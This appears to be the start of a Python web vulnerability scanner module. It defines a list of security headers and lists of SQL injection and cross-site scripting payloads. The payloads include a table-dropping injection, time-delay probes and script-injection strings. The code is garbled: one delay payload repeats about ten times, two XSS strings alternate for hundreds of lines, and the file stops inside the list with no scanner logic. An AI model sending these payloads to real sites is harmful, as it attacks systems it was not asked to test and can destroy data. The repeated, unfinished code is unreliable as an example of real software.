import requests
import sys
import re
import json
import base64
import time
from urllib.parse import quote, unquote
from .progress_display import ProgressTracker

SECURITY_HEADERS = [
    "Content-Security-Policy",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy",
    "X-XSS-Protection",
    "Cache-Control",
    "Pragma",
    "Expires",
    "Access-Control-Allow-Origin",
    "Access-Control-Allow-Methods",
    "Access-Control-Allow-Headers",
    "X-Permitted-Cross-Domain-Policies",
    "Feature-Policy"
]

# Comprehensive attack payloads
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "' UNION SELECT version(),database(),user()--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
